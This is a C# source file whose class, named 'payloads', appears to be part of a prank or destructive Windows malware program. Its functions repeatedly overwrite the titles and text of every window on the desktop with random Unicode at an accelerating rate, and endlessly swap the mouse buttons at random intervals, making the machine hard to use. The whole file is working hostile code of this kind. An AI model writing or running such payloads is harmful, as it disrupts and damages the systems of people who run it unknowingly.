using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;

namespace omicron
{
    internal class payloads
    {
        #region imports

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);

        public delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool SetWindowTextA(IntPtr hWnd, string lpString);

        [DllImport("user32.dll")]
        public static extern int GetWindowTextLengthW(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern bool SwapMouseButton(bool fSwap);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        public static Random r = new Random();
        public static IntPtr NULL = IntPtr.Zero;

        #endregion

        public static string GetRandomUnicode(int length, int minCodePoint = 0x20, int maxCodePoint = 0xFF)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                int codepoint;
                do
                {
                    codepoint = r.Next(minCodePoint, maxCodePoint);
                }
                while (char.IsControl((char)codepoint));
                sb.Append(char.ConvertFromUtf32(codepoint));
            }
            return sb.ToString();
        }

        public static void changeWindowText()
        {
            int i = 2000;
            while(i > 200)
            {
                EnumChildWindows(GetDesktopWindow(), new EnumChildProc(replaceText), NULL);
                Thread.Sleep(i);
                i -= 100;
            }
            while(i > 50)
            {
                EnumChildWindows(GetDesktopWindow(), new EnumChildProc(replaceText), NULL);
                Thread.Sleep(i);
                i -= 25;
            }
            while(true)
            {
                EnumChildWindows(GetDesktopWindow(), new EnumChildProc(replaceText), NULL);
                Thread.Sleep(i);
            }

            bool replaceText(IntPtr hWnd, IntPtr lParam)
            {
                SetWindowTextA(hWnd, GetRandomUnicode(GetWindowTextLengthW(hWnd)));
                return true;
            }
        }

        public static void mousehell()
        {
            while(true)
            {
                Thread.Sleep(r.Next(1000));
                SwapMouseButton(true);
                Thread.Sleep(r.Next(1000));
                SwapMouseButton(false);
            }
        }
    }
}